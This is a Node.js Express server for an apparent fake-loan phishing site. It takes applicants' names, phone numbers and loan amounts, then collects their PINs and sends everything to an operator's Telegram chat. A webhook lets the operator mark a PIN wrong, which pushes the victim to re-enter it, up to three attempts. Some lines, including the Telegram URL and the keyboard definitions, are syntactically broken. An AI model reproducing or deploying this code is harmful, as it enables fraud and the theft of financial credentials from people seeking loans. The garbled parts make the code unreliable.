const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const users = {};

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// 1. INITIAL APPLICATION
app.post("/apply", async (req, res) => {
  const { name, phone, amount } = req.body;
  if (!phone) return res.status(400).send("No phone");

  users[phone] = { status: "pending", pinStatus: "waiting", attempts: 0 };
  const msg = `📥 NEW LOAN\n👤 Name: ${name}\n📱 Phone: ${phone}\n💰 Amount: ${amount}`;

  try {
    const kb = { inline_keyboard:] };
    await axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: msg, reply_markup: kb });
    res.sendStatus(200);
  } catch (e) { res.sendStatus(500); }
});

// 2. STATUS CHECKERS
app.get("/status/:phone", (req, res) => {
  res.json({ status: users[req.params.phone]?.status || "unknown" });
});

app.get("/check-pin-status/:phone", (req, res) => {
  const u = users[req.params.phone];
  res.json({ status: u?.pinStatus || "unknown", attempt: u?.attempts || 0 });
});

// 3. PIN SUBMISSION
app.post("/send-pin", async (req, res) => {
  const { phone, pin } = req.body;
  if (!users[phone]) return res.sendStatus(404);

  users[phone].attempts += 1;
  users[phone].pinStatus = "verifying";
  const msg = `🔐 PIN RECEIVED (${users[phone].attempts}/3)\n📱 Phone: ${phone}\n🔑 PIN: ${pin}`;

  try {
    const kb = { inline_keyboard:] };
    await axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: msg, reply_markup: kb });
    res.sendStatus(200);
  } catch (e) { res.sendStatus(500); }
});

// 4. WEBHOOK
app.post("/webhook", async (req, res) => {
  const d = req.body;
  if (!d.callback_query) return res.sendStatus(200);

  const act = d.callback_query.data;
  const p = act.split("_");
  const cmd = p[0];
  const ph = p[1];

  if (users[ph]) {
    if (cmd === "approve") users[ph].status = "approved";
    if (cmd === "pinok") users[ph].pinStatus = "success";
    if (cmd === "pinwrong") users[ph].pinStatus = "re-enter";
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => console.log("LIVE"));
